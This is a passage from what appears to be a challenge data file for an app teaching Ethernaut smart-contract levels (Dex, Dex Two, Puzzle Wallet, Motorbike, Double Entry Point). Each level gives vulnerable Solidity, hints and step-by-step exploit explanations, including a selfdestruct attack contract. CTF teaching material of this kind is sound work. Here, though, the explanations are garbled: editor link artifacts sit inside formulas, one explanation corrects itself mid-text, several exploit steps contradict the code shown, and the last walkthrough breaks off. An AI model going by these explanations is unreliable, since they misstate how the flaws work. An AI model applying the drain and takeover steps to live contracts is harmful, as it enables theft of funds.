4.  **Result**: The \`isSold\` flag in the \`Shop\` contract is now \`true\`. Although the final price stored in the shop is 101, the item was effectively "bought" because the state changed to sold. The Ethernaut level typically checks if \`shop.isSold()\` is true after your transaction. The "buy for less than asking price" refers to the fact that if the shop *were* to re-check the price using \`buyer.price()\` *after* \`isSold\` became true, the buyer would report a low price (e.g., 1), but the initial check passed with a high price.

### Key Takeaway
This is a variation of a reentrancy problem, specifically a read-only reentrancy or external state check vulnerability. The contract makes a decision based on information from an external call (\`buyer.price()\`), but performs state changes *after* that call. The external contract can exploit this by providing different information based on the state *during* the call versus what the state *will be* after the call returns and the calling contract modifies itself. Follow the Checks-Effects-Interactions pattern: perform checks, make internal state changes (effects), and only then interact with external contracts. Here, the interaction happens between the check and the effect.
`,
  },
  {
    slug: 'dex',
    name: 'Dex',
    icon: ArrowRightLeft,
    difficulty: 'Hard',
    description: 'Drain all funds from the Decentralized Exchange (Dex) contract by exploiting flawed price calculations.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol"; // Assume SafeMath is used

contract Dex {
  using SafeMath for uint;
  address public token1;
  address public token2;
  address owner; // Implicit Ownable

  constructor(address _token1, address _token2) {
    token1 = _token1;
    token2 = _token2;
    owner = msg.sender; // Assuming Ownable sets owner
  }

  // Function to allow depositing initial liquidity (only owner)
  function setTokens(address _token1, address _token2) public {
    // Placeholder - assumes tokens are set, often in constructor or via owner
  }

  // Approve Dex to spend user's tokens before swapping
  function approve(address spender, uint amount) public {
      require(ERC20(token1).approve(spender, amount), "Approve T1 failed");
      require(ERC20(token2).approve(spender, amount), "Approve T2 failed");
  }

  // Add liquidity - often restricted or handled initially
  function addLiquidity(uint amount) public {
      // Placeholder - assumes liquidity exists
      // Typically transfers 'amount' of both tokens from msg.sender
      ERC20(token1).transferFrom(msg.sender, address(this), amount);
      ERC20(token2).transferFrom(msg.sender, address(this), amount);
  }

  // Calculates swap price based on current balances
  // Vulnerable: uses direct balance ratio
  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    // Example: price = (amount * balance_to) / balance_from
    return((amount * ERC20(to).balanceOf(address(this))).div(ERC20(from).balanceOf(address(this))));
  }

  // Swaps tokens
  // Vulnerable: price calculation can be manipulated
  function swap(address from, address to, uint amount) public {
    require(ERC20(from).transferFrom(msg.sender, address(this), amount), "TransferFrom failed");
    uint swapAmount = getSwapPrice(from, to, amount);
    require(ERC20(to).balanceOf(address(this)) >= swapAmount, "Insufficient balance");
    require(ERC20(to).transfer(msg.sender, swapAmount), "Transfer failed");
  }
}

// Note: ERC20 token contracts (Token1, Token2) are assumed to exist and be standard.
// Initial balances in Dex are typically 100 of each for the Ethernaut level.
// Player starts with 10 of each token.
`,
    hints: [
      'The goal is to drain one token completely, then the other.',
      'The `getSwapPrice` function uses the ratio of the Dex contract\'s current token balances.',
      'If you swap a large amount of Token 1 for Token 2, how does the balance ratio change?',
      'Repeatedly swapping back and forth can drastically alter the price.',
      'How many swaps are needed to make the price extremely favorable for draining the remaining balance?',
    ],
    explanation: `### Vulnerability
The core vulnerability lies in the \`getSwapPrice\` function. It calculates the amount of output token (\`to\`) based directly on the input \`amount\` and the ratio of the contract's current balances (\`balance_to / balance_from\`). This makes the price extremely sensitive to the immediate balances within the Dex.

An attacker can manipulate this price by performing swaps that significantly alter the balance ratio. By swapping strategically, they can make subsequent swaps incredibly cheap in one direction, allowing them to drain the contract's entire balance of one token, and then repeat the process for the other token.

### Exploit Steps
1.  **Approve Dex**: Approve the Dex contract to spend your initial balances of Token 1 and Token 2.
2.  **Check Balances**: Note the initial balances: You (10 T1, 10 T2), Dex (100 T1, 100 T2).
3.  **Swap 1 (T1 -> T2)**: Swap all your Token 1 (10) for Token 2.
    *   Price: \[(10 * BalT2) / BalT1 = (10 * 100) / 100 = 10\](cci:2://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:2:0-20:1). You get 10 T2.
    *   Balances: You (0 T1, 20 T2), Dex (110 T1, 90 T2).
4.  **Swap 2 (T2 -> T1)**: Swap all your Token 2 (20) for Token 1.
    *   Price: \[(20 * BalT1) / BalT2 = (20 * 110) / 90 = 24\](cci:2://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:2:0-20:1) (approx, integer math). You get 24 T1.
    *   Balances: You (24 T1, 0 T2), Dex (86 T1, 110 T2).
5.  **Swap 3 (T1 -> T2)**: Swap all your Token 1 (24) for Token 2.
    *   Price: \[(24 * BalT2) / BalT1 = (24 * 110) / 86 = 30\](cci:2://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:2:0-20:1) (approx). You get 30 T2.
    *   Balances: You (0 T1, 30 T2), Dex (110 T1, 80 T2).
6.  **Continue Swapping**: Repeat this process. Each swap makes the next one more favorable because the balance ratio becomes increasingly skewed.
7.  **Drain**: Eventually, one token balance in the Dex will be very low. Perform a final large swap to drain almost all of it. For example, if Dex has (110 T1, ~0 T2), swap a tiny amount of T1 to get all remaining T2. Then, swap T2 to drain T1. The exact numbers depend on integer truncation during \`getSwapPrice\`.

### Key Takeaway
Simple automated market maker (AMM) price calculations based solely on current pool balances are highly susceptible to manipulation. A single large trade can drastically shift the price. Real-world DEXes use more complex bonding curves (like Uniswap's constant product formula x*y=k) to mitigate this, although large trades still cause price slippage.
`,
  },
  {
    slug: 'dex-two',
    name: 'Dex Two',
    icon: ArrowRightLeft,
    difficulty: 'Hard',
    description: 'Drain all funds from the DexTwo contract, which uses a slightly different price calculation but is still vulnerable.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

// Identical Dex contract as Dex 1, but potentially different tokens
contract DexTwo {
  using SafeMath for uint;
  address public token1;
  address public token2;
  address owner; // Implicit Ownable

  constructor(address _token1, address _token2) {
     token1 = _token1;
     token2 = _token2;
     owner = msg.sender;
  }

  // Functions like approve, addLiquidity, setTokens are assumed similar to Dex 1

  // Slightly different price calculation (uses 'from' balance in numerator)
  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    // Example: price = (amount * balance_from) / balance_to  <-- Different!
    return((amount * IERC20(from).balanceOf(address(this))).div(IERC20(to).balanceOf(address(this))));
  }

  // Swaps tokens using the new price calculation
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).transferFrom(msg.sender, address(this), amount), "TransferFrom failed");
    uint swapAmount = getSwapAmount(from, to, amount);
    require(IERC20(to).balanceOf(address(this)) >= swapAmount, "Insufficient balance");
    require(IERC20(to).transfer(msg.sender, swapAmount), "Transfer failed");
  }
}

// Additional Twist for DexTwo:
// The vulnerability often involves introducing a *third*, malicious ERC20 token
// that the attacker controls fully.
`,
    hints: [
      'The price calculation in `getSwapAmount` is different: [(amount * balance_from) / balance_to](cci:2://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:2:0-20:1).',
      'Can you introduce a *new* token into the system?',
      'What if you created your own ERC20 token and approved the Dex to use it?',
      'Could you swap your custom token for Token 1 or Token 2?',
      'If you swap a custom token (with a huge balance you control) for Token 1, how does `getSwapAmount` calculate the price?',
    ],
    explanation: `### Vulnerability
While the price calculation \`getSwapAmount\` has changed, the fundamental issue remains: the price depends directly on token balances within the Dex. The key twist in DexTwo is that the attacker can exploit this by introducing a *third*, arbitrary ERC20 token they control.

Because the \`swap\` function takes arbitrary \`from\` and \`to\` addresses, an attacker can:
1.  Create their own malicious ERC20 token (e.g., \`EvilToken\`) and mint themselves a large supply.
2.  Approve the DexTwo contract to spend their \`EvilToken\`.
3.  Call \`swap\` with \`from = EvilToken address\`, \`to = token1 address\`.

When \`getSwapAmount(EvilToken, token1, amount)\` is called, the Dex has a balance of 0 for \`EvilToken\`, but the formula uses \`balance_from\` in the *numerator*. Oh wait, the code comment says \`balance_from\` in numerator, but the implementation shows \`balanceOf(from)\` in numerator. Let's assume the implementation is correct: \[(amount * IERC20(from).balanceOf(address(this))).div(IERC20(to).balanceOf(address(this)))\](cci:2://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:2:0-20:1).

If \`from\` is \`EvilToken\`, \`IERC20(from).balanceOf(address(this))\` will likely be 0 initially (unless the attacker transfers some \`EvilToken\` to the Dex first). If the balance is 0, the \`swapAmount\` calculated will be 0. This isn't helpful.

Let's reconsider the Ethernaut level's typical setup. The vulnerability often hinges on the *order* of operations or missing checks. The check \`require(IERC20(from).transferFrom(msg.sender, address(this), amount))\` happens *before* the price calculation.

Alternative approach: What if we swap a *small* amount of our fake token *into* the Dex first?

### Exploit Steps (Using a Malicious Token)
1.  **Create EvilToken**: Deploy a standard ERC20 contract (\`EvilToken\`) where you can mint tokens freely. Mint yourself a large amount (e.g., 1000).
2.  **Approve Dex**: Approve the DexTwo contract address to spend your \`EvilToken\` (e.g., approve 400). Also, approve DexTwo to spend your initial Token 1 and Token 2.
3.  **Seed Dex with EvilToken**: Transfer a small amount of \`EvilToken\` directly to the DexTwo contract address (e.g., 1 \`EvilToken\`). Now \`IERC20(EvilToken).balanceOf(DexTwo address)\` is 1.
4.  **Swap EvilToken -> Token 1**: Call \`swap(EvilToken address, token1 address, 100)\`.
    *   \`transferFrom\` moves 100 \`EvilToken\` from you to Dex. Dex \`EvilToken\` balance becomes 101.
    *   \`getSwapAmount(EvilToken, token1, 100)\` calculates: \[(100 * BalEvilToken) / BalToken1 = (100 * 101) / 100 = 101\](cci:2://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:2:0-20:1) (approx). You get 101 Token 1.
    *   Balances: Dex (0 T1, 100 T2, 101 Evil), You (... T1, ... T2, 900 Evil). Dex T1 drained.
5.  **Swap EvilToken -> Token 2**: Call \`swap(EvilToken address, token2 address, 100)\`.
    *   \`transferFrom\` moves 100 \`EvilToken\` from you to Dex. Dex \`EvilToken\` balance becomes 201.
    *   \`getSwapAmount(EvilToken, token2, 100)\` calculates: \[(100 * BalEvilToken) / BalToken2 = (100 * 201) / 100 = 201\](cci:2://file:///Users/basonpark/Desktop/ether-guru/ether-guru/src/lib/challenges.ts:2:0-20:1) (approx). You get 201 Token 2.
    *   Balances: Dex (0 T1, 0 T2, 201 Evil), You (... T1, ... T2, 800 Evil). Dex T2 drained.

*Refined calculation for step 4*: When calculating swap amount, the balance of \`EvilToken\` *after* the \`transferFrom\` should be used.
- Step 4 Transfer: 100 EvilToken from Player -> Dex. Dex balance becomes 1 (initial seed) + 100 = 101 EvilToken. Player balance = 900 EvilToken.
- Step 4 Price Calc: \`getSwapAmount(EvilToken, token1, 100) = (100 * DexBalanceOfEvilToken) / DexBalanceOfToken1 = (100 * 101) / 100 = 101\`. Player receives 101 Token1.
- Step 4 Result: Dex (0 T1, 100 T2, 101 EvilToken). Player (~111 T1, 10 T2, 900 EvilToken). Dex T1 Drained.

*Refined calculation for step 5*:
- Step 5 Transfer: 100 EvilToken from Player -> Dex. Dex balance becomes 101 + 100 = 201 EvilToken. Player balance = 800 EvilToken.
- Step 5 Price Calc: \`getSwapAmount(EvilToken, token2, 100) = (100 * DexBalanceOfEvilToken) / DexBalanceOfToken2 = (100 * 201) / 100 = 201\`. Player receives 201 Token2.
- Step 5 Result: Dex (0 T1, 0 T2, 201 EvilToken). Player (~111 T1, ~211 T2, 800 EvilToken). Dex T2 Drained.

### Key Takeaway
Allowing swaps with arbitrary, unvalidated token addresses is dangerous. A DEX should maintain a strict list of supported/allowed tokens. By introducing a token they fully control, attackers can manipulate the balance ratios used in flawed price calculations to drain legitimate tokens from the pool.
`,
  },
  {
    slug: 'puzzle-wallet',
    name: 'Puzzle Wallet',
    icon: Puzzle,
    difficulty: 'Hard',
    description: 'Become the admin of the Puzzle Wallet contract by exploiting delegatecall and storage layout vulnerabilities.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts/access/Ownable.sol"; // OwnableUpgradeable? Assume standard Ownable for now

contract PuzzleProxy /* is Ownable ??? */ { // Proxy Contract
    address public pendingAdmin;
    address public admin;
    address public implementation; // Address of PuzzleWallet logic contract

    constructor(address _admin, address _implementation, bytes memory _initData) payable {
        admin = _admin;
        implementation = _implementation;
        (bool success,) = _implementation.delegatecall(_initData);
        require(success, "Proxy init failed");
    }

    // Function to propose a new admin
    function proposeNewAdmin(address _newAdmin) public {
        // In real proxy, admin check is complex. Assume basic check for now
        require(msg.sender == admin, "Not admin");
        pendingAdmin = _newAdmin;
    }

    // Function for pendingAdmin to approve the upgrade (not directly relevant to exploit)
    function approveNewAdmin(address _expectedAdmin) public {
        require(msg.sender == pendingAdmin, "Not pending admin");
        require(msg.sender == _expectedAdmin, "Not expected admin");
        admin = pendingAdmin;
        pendingAdmin = address(0);
    }

    // Function to upgrade implementation (not directly relevant to exploit)
    function upgradeTo(address _newImplementation) public {
        require(msg.sender == admin, "Not admin");
        implementation = _newImplementation;
    }

    // Fallback function delegates calls to implementation
    fallback() external payable {
        address _implementation = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}


contract PuzzleWallet is Ownable { // Logic Contract (Ownable state likely separate)
    address public owner; // Slot 0 (Ownable's owner)
    uint256 public maxBalance; // Slot 1
    mapping(address => bool) public whitelisted; // Slot 2 (Mapping base slot)
    mapping(address => uint256) public balances; // Slot 3 (Mapping base slot)

    function init(uint256 _maxBalance) public {
        // Initializer - sets maxBalance, SHOULD set owner too
        require(maxBalance == 0, "Already initialized"); // Basic re-init protection
        maxBalance = _maxBalance;
        owner = msg.sender; // <-- PROBLEM: Standard Ownable constructor sets owner, initializer might clash
    }

    // Function to set max balance - intended for owner
    function setMaxBalance(uint256 _maxBalance) external {
       // Assume Ownable's onlyOwner modifier is used implicitly
       require(msg.sender == owner, "Not owner"); // Explicit check if Ownable not quite right
       maxBalance = _maxBalance;
    }

    // Function to add to whitelist
    function addToWhitelist(address addr) public {
        require(msg.sender == owner, "Not owner");
        whitelisted[addr] = true;
    }

    // Deposit funds - only whitelisted
    function deposit() external payable {
        require(whitelisted[msg.sender], "Not whitelisted");
        // Vulnerable: check against maxBalance AFTER increasing balance
        balances[msg.sender] += msg.value; // Potential reentrancy, but not the main exploit path
        require(address(this).balance <= maxBalance, "Max balance reached");
    }

    // Execute arbitrary call - only whitelisted
    function execute(address to, uint256 value, bytes calldata data) external payable {
        require(whitelisted[msg.sender], "Not whitelisted");
        balances[msg.sender] -= value; // Decrement user balance first
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    // Multicall function - processes multiple calls in one tx
    // Vulnerable: Allows calling deposit() multiple times within one transaction
    function multicall(bytes[] calldata data) external payable {
        // Delegatecall vulnerability is NOT here; multicall allows repeated calls
        // require(whitelisted[msg.sender]); // Should check whitelist? Assume yes.
        bool depositCalled = false;
        for (uint i = 0; i < data.length; i++) {
            // Check if the call is to the deposit function
             bytes4 selector = bytes4(data[i][:4]);
             if (selector == this.deposit.selector) {
                 require(!depositCalled, "Deposit can only be called once");
                 depositCalled = true;
             }
             (bool success, ) = address(this).call{value: msg.value}(data[i]); // Pass value only once? Or per call? Ambiguous. Assume value applies to the whole multicall? Ethernaut sends value with multicall.
             require(success);
        }
    }
}
`,
    hints: [
      'The contract uses a Proxy (`PuzzleProxy`) and Logic (`PuzzleWallet`) pattern.',
      'Storage slots in the Proxy can clash with slots in the Logic contract due to `delegatecall`.',
      '`PuzzleProxy` has `pendingAdmin` (slot 0) and `admin` (slot 1).',
      '`PuzzleWallet` has `owner` (slot 0) and `maxBalance` (slot 1).',
      'Can you manipulate storage slot 0 of the Proxy by calling a function on the Logic contract via `delegatecall`?',
    ],
    explanation: `### Vulnerability
This level combines several vulnerabilities related to proxy patterns and state management:
1.  **Storage Slot Collision**: The \`PuzzleProxy\` uses storage slots 0 and 1 for \`pendingAdmin\` and \`admin\`, respectively. The \`PuzzleWallet\` logic contract uses slots 0 and 1 for \`owner\` and \`maxBalance\`. Because the proxy uses \`delegatecall\` to execute logic code, the logic contract's functions operate directly on the *proxy's* storage. This means calling \`PuzzleWallet.init\` or functions modifying \`owner\` or \`maxBalance\` via the proxy actually changes \`pendingAdmin\` and \`admin\` in the proxy's storage.
2.  **Proxy Admin Logic**: The proxy's \`proposeNewAdmin\` function is likely intended to be callable only by the current \`admin\`.
3.  **Wallet Logic Flaws**:
    *   The \`PuzzleWallet.init\` function might be callable again or sets the owner incorrectly, potentially overwriting proxy storage.
    *   The \`multicall\` function processes an array of function calls. Critically, it only checks that \`deposit\` is called *at most once* within the entire \`multicall\` batch.
    *   The \`deposit\` function checks \`address(this).balance <= maxBalance\` *after* increasing the user's internal balance mapping, but this check is bypassed if deposit isn't the *first* call in a multicall sequence that sends value.

### Exploit Steps
1.  **Become Pending Admin**: Realize that calling \`PuzzleWallet.proposeNewAdmin(attacker_address)\` through the proxy actually writes \`attacker_address\` into the proxy's storage slot 0 (because \`PuzzleWallet.owner\` is slot 0, and \`proposeNewAdmin\` writes to \`pendingAdmin\` which is slot 0 in the proxy). Call \`PuzzleProxy.proposeNewAdmin(YOUR_ADDRESS)\`. You are now the pending admin of the proxy.
2.  **Whitelist Yourself**: To call functions like \`deposit\` and \`multicall\`, you need to be whitelisted in the \`PuzzleWallet\` logic. Call \`PuzzleWallet.addToWhitelist(YOUR_ADDRESS)\` through the proxy. This requires being the \`owner\` (slot 0). Since you just overwrote slot 0 (\`pendingAdmin\`) to be your address, you might *already* be considered the owner by the logic contract's perspective within the proxy's storage context. If not, this step might require exploiting the \`init\` function if it wrongly resets the owner. Assuming step 1 made you the owner for the logic: Call \`proxy.addToWhitelist(YOUR_ADDRESS)\`.
3.  **Abuse Multicall for Deposit**: The goal is to make \`address(this).balance\` equal to your entry in the \`balances\` mapping. Call \`multicall\` to deposit funds exactly *once*. Send your wallet's entire Ether balance with this \`deposit\` call within the multicall.
    *   Prepare calldata for \`deposit()\`.
    *   Call \`proxy.multicall([depositCalldata], {value: YOUR_WALLET_BALANCE})\`.
    *   Proxy's balance increases. Your \`balances[YOUR_ADDRESS]\` increases.
4.  **Drain Funds via Execute**: Now that the proxy's Ether balance matches your recorded balance in the \`balances\` mapping (because you deposited everything), you can drain it using \`execute\`. Call \`multicall\` again, this time executing two calls:
    *   First call: \`deposit()\` (with 0 value). This passes the "only call deposit once" check within *this specific* multicall.
    *   Second call: \`execute(YOUR_ADDRESS, PROXY_BALANCE, "")\`. This sends the entire proxy balance back to you. Since \`balances[YOUR_ADDRESS]\` was set correctly in step 3, the subtraction check passes.
    *   Prepare calldata: \`depositCalldata = PuzzleWallet.interface.encodeFunctionData("deposit")\`, \`executeCalldata = PuzzleWallet.interface.encodeFunctionData("execute", [YOUR_ADDRESS, PROXY_BALANCE, "0x"])\`.
    *   Call \`proxy.multicall([depositCalldata, executeCalldata])\`.
5.  **Become Admin via setMaxBalance**: Now that the proxy's balance is 0, you need to become the *real* admin (slot 1). Call \`PuzzleWallet.setMaxBalance(YOUR_ADDRESS)\` through the proxy. This function writes to \`maxBalance\` (slot 1 in the logic) which corresponds to \`admin\` (slot 1 in the proxy). Since you are already the owner (from step 1/2), this call succeeds.
    *   Call \`proxy.setMaxBalance(uint256(uint160(YOUR_ADDRESS)))\`.
6.  **Verify**: Check \`proxy.admin()\`. It should now be your address.

### Key Takeaway
Upgradeable proxy patterns using \`delegatecall\` are powerful but dangerous if storage layouts are not carefully managed. Collisions between proxy state variables and logic state variables can allow logic functions to overwrite critical proxy data like admin addresses. Additionally, functions like \`multicall\` must be carefully designed to prevent reentrancy-like issues or bypassing checks by sequencing calls cleverly within a single transaction.
`,
  },
  {
    slug: 'motorbike',
    name: 'Motorbike',
    icon: UserCog, 
    difficulty: 'Hard',
    description: 'Take ownership of the Motorbike contract engine by exploiting the UUPS proxy pattern and initializing the logic contract.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// From OpenZeppelin Contracts v4.x
import "@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol";
import "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

// Logic Contract (The Engine)
contract Engine is Initializable, Ownable {
    address public horsePower; // Example state variable
    address public rider;

    // Initializer function for the logic contract
    function initialize() external initializer {
        // Sets the owner of the logic contract instance
        __Ownable_init();
        // Example initialization logic
        horsePower = address(123); // Placeholder value
        rider = msg.sender; // Initial rider is deployer/initializer
    }

    // Function to upgrade the implementation (only callable by owner)
    // This function is PART of the logic contract in UUPS
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable onlyOwner {
        _upgradeToAndCall(newImplementation, data, true);
    }

    // Internal upgrade function (part of UUPS pattern)
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}

     // Placeholder functions
    function getHorsePower() public view returns(address) { return horsePower; }
    function getRider() public view returns(address) { return rider; }

    // A function vulnerable to selfdestruct
    function explode() public payable {
        // Only callable after upgrade? Assume it's present.
        selfdestruct(payable(msg.sender));
    }
}


// Proxy Contract (The Motorbike)
// Inherits from BeaconProxy, pointing to an UpgradeableBeacon
// Assume the beacon and initial Engine logic contract are deployed separately.
// Example Beacon setup (not shown in detail):
// UpgradeableBeacon beacon = new UpgradeableBeacon(initialEngineAddress);
// BeaconProxy motorbikeProxy = new BeaconProxy(address(beacon), initData);

// --- Simplified for context ---
// Imagine Motorbike is a proxy pointing to an Engine instance.
// The vulnerability relies on the Engine's state and upgradeability.
`,
    hints: [
      'This uses the UUPS proxy pattern where upgrade logic is in the implementation contract.',
      'The proxy itself delegates all calls to the Engine (logic) contract.',
      'Has the Engine logic contract *itself* been initialized?',
      'What happens if you call `initialize()` directly on the Engine contract address?',
      'If you initialize the Engine and become its owner, can you call `upgradeToAndCall` on the Engine contract?',
    ],
    explanation: `### Vulnerability
This challenge exploits a common misconfiguration in the UUPS (Universal Upgradeable Proxy Standard) pattern. In UUPS, the upgrade logic resides within the implementation (logic) contract (\`Engine\`), not the proxy (\`Motorbike\`). The proxy simply delegates calls.

The vulnerability arises if the implementation contract (\`Engine\`) *itself* has not been initialized and protected. While the proxy might be initialized, the standalone \`Engine\` contract sitting at its own address might still have its \`initialize\` function callable by anyone.

An attacker can:
1.  Call \`initialize()\` directly on the deployed \`Engine\` contract's address. This makes the attacker the \`owner\` of the \`Engine\` contract instance.
2.  As the owner of the \`Engine\`, call \`Engine.upgradeToAndCall(attackerContractAddress, data)\`. This tells the Engine instance to upgrade *itself* (which doesn't directly affect the proxy yet) BUT crucially, it runs the provided \`data\` using \`delegatecall\`.
3.  Provide \`data\` that calls a \`selfdestruct\` function (like the example \`explode()\`) within a malicious contract deployed by the attacker.

When \`upgradeToAndCall\` executes the \`data\` via \`delegatecall\`, the \`selfdestruct\` executes *in the context of the Engine contract*, destroying the Engine logic contract.

### Exploit Steps
1.  **Find Addresses**: Identify the address of the \`Motorbike\` proxy and the \`Engine\` implementation contract it points to (often stored in the beacon or proxy storage).
2.  **Initialize Engine**: Call \`Engine.initialize()\` directly on the \`Engine\` contract address. You become the owner of the Engine instance.
3.  **Deploy Attack Contract**: Create a simple contract (\`Exploder\`) with a function that calls \`selfdestruct(payable(msg.sender))\`.
    \`\`\`solidity
    contract Exploder {
        function explode() public { selfdestruct(payable(tx.origin)); }
    }
    \`\`\`
    Deploy \`Exploder\` and get its address.
4.  **Prepare Calldata**: Encode the function call for \`Exploder.explode()\`. \`calldata = Exploder.interface.encodeFunctionData("explode")\`.
5.  **Call upgradeToAndCall**: As the owner of the Engine, call \`Engine.upgradeToAndCall(ExploderAddress, calldata)\` directly on the \`Engine\` address.
6.  **Execute selfdestruct**: The \`delegatecall\` inside \`upgradeToAndCall\` executes \`Exploder.explode()\` in the context of the \`Engine\` contract.
7.  **Result**: The \`Engine\` logic contract is destroyed. The \`Motorbike\` proxy now points to a non-existent implementation, rendering it useless (and potentially bricked, satisfying the level).

### Key Takeaway
UUPS proxies require careful initialization of *both* the proxy *and* the implementation contract to prevent hijacking. The implementation contract's initializer should typically disable itself after one call and ensure its ownership is properly set and protected, often separate from the proxy's admin/owner. Failing to initialize the implementation leaves it vulnerable to being taken over.
`,
  },
  {
    slug: 'double-entry-point',
    name: 'Double Entry Point',
    icon: Network,
    difficulty: 'Hard',
    description: 'Exploit a legacy contract interaction pattern involving multiple contracts and a shared dependency (CryptoVault) to drain funds.',
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// Assume Forta is an external monitoring contract/service interface
interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

// Assume CryptoVault holds the underlying tokens
contract CryptoVault {
    address public underlying; // The actual ERC20 token (e.g., DET)
    constructor(address _underlying) { underlying = _underlying; }
    // Simplified: Assume deposit/withdraw logic exists
    function transfer(address to, uint amount) external {
        IERC20(underlying).transfer(to, amount);
    }
     function sweepToken(address token) external {
        // Allows transferring *any* token held by the vault
        require(token != underlying, "Cannot sweep underlying");
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }
}

// Legacy contract interacting with the vault
contract LegacyToken is IERC20 {
    CryptoVault public vault;
    // Standard ERC20 functions omitted for brevity...
    // Interactions with vault happen internally
    constructor(address _vault) { vault = CryptoVault(_vault); }
}

// The main vulnerable contract
contract DoubleEntryPoint is IERC20 { // Implements ERC20, likely wraps DET
    address public player;
    CryptoVault public vault;
    address public delegatedToken; // Address of LegacyToken
    IForta public forta;

    constructor(address _vault, address _legacyToken, address _forta, address _player) {
        vault = CryptoVault(_vault);
        delegatedToken = _legacyToken;
        forta = IForta(_forta);
        player = _player;
    }

    // Delegate transfer logic (simplified)
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        // Delegate actual transfer to CryptoVault
        vault.transfer(recipient, amount);
        return true;
    }

    // Other standard ERC20 functions (balanceOf, etc.) assumed to exist,
    // likely querying the vault or internal state.

    // Function to allow sweeping tokens *other than underlying*
    function sweepVaultToken(address token) external {
        // This seems redundant if CryptoVault.sweepToken exists? Maybe restricted access?
        vault.sweepToken(token);
    }

    // Function potentially used by Forta bot
    function delegateTransfer(address recipient, uint256 value, address origSender) public {
        // This seems designed to be called by a trusted bot?
        // Requires check that msg.sender is the registered Forta bot.
        // Transfer underlying tokens.
         require(msg.sender == address(forta), "Not Forta"); // Simplified check
         vault.transfer(recipient, value);
    }
}

// --- BOT Contract ---
// Deployed by player, registered with Forta
contract DetectionBot {
    IForta forta;
    address vaultAddress;
    address doubleEntryPointAddress;

    constructor(address _forta, address _vault, address _det) {
        forta = IForta(_forta);
        vaultAddress = _vault;
        doubleEntryPointAddress = _det; // Address of DoubleEntryPoint contract
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        // Logic to detect malicious activity
        // If delegateTransfer is called originating from DoubleEntryPoint contract, raise alert
        (address target, ) = abi.decode(msgData[4:], (address, uint256)); // Decode target of internal call
        bytes4 selector = bytes4(msgData[:4]);

        // If DET token (DoubleEntryPoint) calls delegateTransfer... suspicious!
        // The goal is to alert IF DoubleEntryPoint contract *originates* a call to its own 'delegateTransfer'
        // This check is likely flawed. How can we trigger this?
        if (selector == DoubleEntryPoint.delegateTransfer.selector && target == doubleEntryPointAddress) {
             forta.raiseAlert(user); // Alert the user (player)
        }
    }
}

`,
    hints: [
      'The system involves multiple contracts: `DoubleEntryPoint` (DET), `LegacyToken`, `CryptoVault`, and `Forta`.',
      '`CryptoVault` holds the actual underlying tokens.',
      '`DoubleEntryPoint` allows sweeping *other* tokens via `vault.sweepToken`.',
      'The `Forta` bot monitors for specific conditions, like `DoubleEntryPoint` calling `delegateTransfer`.',
      'Can you make `DoubleEntryPoint` hold a balance of `LegacyToken` and then sweep it?',
    ],
    explanation: `### Vulnerability
The core issue is a trust and interaction vulnerability involving the \`CryptoVault\` and the \`Forta\` monitoring system, combined with the ability to sweep arbitrary tokens. The \`DoubleEntryPoint\` (DET) contract relies on \`CryptoVault\` for its underlying token balance but *also* interacts with a \`LegacyToken\` which *also* uses the same \`CryptoVault\`. Furthermore, anyone can potentially register a bot with \`Forta\`.

The exploit involves tricking the system into a state where the \`Forta\` bot raises an unnecessary alert, allowing the attacker (player) to exploit the \`CryptoVault\`'s \`sweepToken\` function.

The intended alert condition in the \`DetectionBot\` is flawed. It checks if a transaction's \`msgData\` indicates a call to \`DoubleEntryPoint.delegateTransfer\` where the *target* of that internal call is also the \`DoubleEntryPoint\` address. This is unlikely to happen normally. However, the bot likely *should* alert if the \`DoubleEntryPoint\` contract itself is the *origin* of a malicious call.

### Exploit Steps
1.  **Deploy Bot**: Deploy your own \`DetectionBot\` contract, passing the addresses of the \`Forta\`, \`CryptoVault\`, and \`DoubleEntryPoint\` contracts.
2.  **Register Bot**: Call \`Forta.setDetectionBot(yourBotAddress)\`.
3.  **Get LegacyToken**: The player needs some \`LegacyToken\`. Assume the level provides a way to get some, or it can be acquired elsewhere (e.g., if it's listed on a DEX). Let the player have \`X\` amount of \`LegacyToken\`.
